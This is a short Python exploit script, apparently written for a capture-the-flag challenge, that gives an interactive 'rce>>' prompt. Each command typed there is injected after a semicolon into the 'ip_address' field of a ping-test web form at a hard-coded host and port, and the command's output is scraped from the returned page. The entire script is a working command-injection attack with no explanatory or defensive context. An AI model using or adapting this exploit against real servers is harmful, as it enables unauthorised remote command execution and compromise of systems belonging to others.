#!/usr/bin/python3
from requests import post

cmd = input('rce>> ')
ip = '159.65.20.166' # change this
port = '30526' # change this

data = {'test': 'ping', 'ip_address': f'{ip}; {cmd}', 'submit': 'Test'}
r = post(f'{ip}:{port}/', data=data)

data = r.text
data = data.split('packet loss\n')[-1]
data = data.split('</textarea>')[0]

print(data.strip())
